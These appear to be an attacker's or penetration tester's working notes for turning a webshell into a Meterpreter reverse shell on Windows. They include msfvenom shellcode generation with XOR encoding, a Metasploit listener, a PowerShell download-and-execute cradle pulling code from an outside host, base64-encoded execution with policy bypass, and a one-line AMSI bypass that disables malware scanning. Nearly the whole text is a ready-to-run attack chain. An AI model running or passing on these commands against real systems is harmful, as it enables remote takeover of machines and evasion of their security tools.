# Current — Active Engagement Files

## Goal
Meterpreter via PowerShell through a webshell. No C# compilation. AMSI bypassed in-memory.

---

## Step 1 — Generate + Encode Shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.160 LPORT=443 EXITFUNC=thread -f raw -o shell.bin

python3 -c "
data = open('shell.bin','rb').read()
enc = bytes(b ^ 0xfa for b in data)
print('[Byte[]] \$buf = ' + ','.join(f'0x{b:02x}' for b in enc))
" > buf.txt
```

## Step 2 — Build shell.ps1

Replace the placeholder `[Byte[]] $buf = 0x00` line in `shell.ps1` with the contents of `buf.txt`.

## Step 3 — Start Listener + Host

```bash
# Terminal 1
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.160; set LPORT 443; exploit -j"

# Terminal 2
cd Current
python3 -m http.server 80
```

## Step 4 — Generate Encoded Webshell Command

```bash
python3 -c "
import base64
cmd = 'IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.160/shell.ps1\")'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
"
```

## Step 5 — Fire from Webshell

```
powershell -ep bypass -enc <OUTPUT_FROM_STEP_4>
```

---

## If AMSI Still Blocks shell.ps1

The `amsiContext` bypass at the top of shell.ps1 may be getting scanned before it executes.
Split delivery: send the bypass first, then the payload.

```bash
# Serve bypass separately
echo '$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$a.GetField("amsiContext","NonPublic,Static").SetValue($null,[IntPtr]::Zero)' > bypass.ps1
python3 -m http.server 80
```

From webshell — two commands:
```
# First:
powershell -ep bypass -enc <base64 of IEX bypass.ps1>

# Then (same session):
powershell -ep bypass -enc <base64 of IEX shell.ps1>
```
